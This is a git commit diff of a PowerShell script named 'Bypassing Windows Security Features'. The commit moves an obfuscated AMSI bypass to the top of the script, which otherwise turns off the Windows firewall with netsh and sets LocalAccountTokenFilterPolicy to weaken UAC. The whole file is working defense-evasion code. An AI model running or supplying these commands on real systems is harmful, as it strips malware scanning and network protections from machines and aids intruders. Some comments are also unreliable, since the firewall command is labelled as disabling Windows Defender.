befd1dab2b63ee69143fda52cd6ff61d13c3be20
Jonmar Corpuz <121370426+JonmarCorpuz@users.noreply.github.com>
2023-08-16 19:08:50 -0400

    Update PowerShell - Bypassing Windows Security Features.ps1

--- PowerShell - Bypassing Windows Security Features.ps1
+++ PowerShell - Bypassing Windows Security Features.ps1
@@ -1,9 +1,9 @@
+# Bypass AMSI
+$Oops='.SetValue($null,$true)'
+[Ref].Assembly.GetType('Sy'+'ste'+'m.'+'Man'+'ag'+'eme'+'nt'+'.Au'+'to'+'mat'+'io'+'n.A'+'ms'+'iUt'+'ils').GetField('ams'+'iI'+'nit'+'Fa'+'iled','No'+'nPu'+'bl'+'ic,'+'St'+'atic').$Oops
+
 # Disable WinDefender 
 netsh advfirewall set allprofiles state off
 
 # Disable UAC
 reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
-
-# Bypass AMSI
-$Oops='.SetValue($null,$true)'
-[Ref].Assembly.GetType('Sy'+'ste'+'m.'+'Man'+'ag'+'eme'+'nt'+'.Au'+'to'+'mat'+'io'+'n.A'+'ms'+'iUt'+'ils').GetField('ams'+'iI'+'nit'+'Fa'+'iled','No'+'nPu'+'bl'+'ic,'+'St'+'atic').$Oops
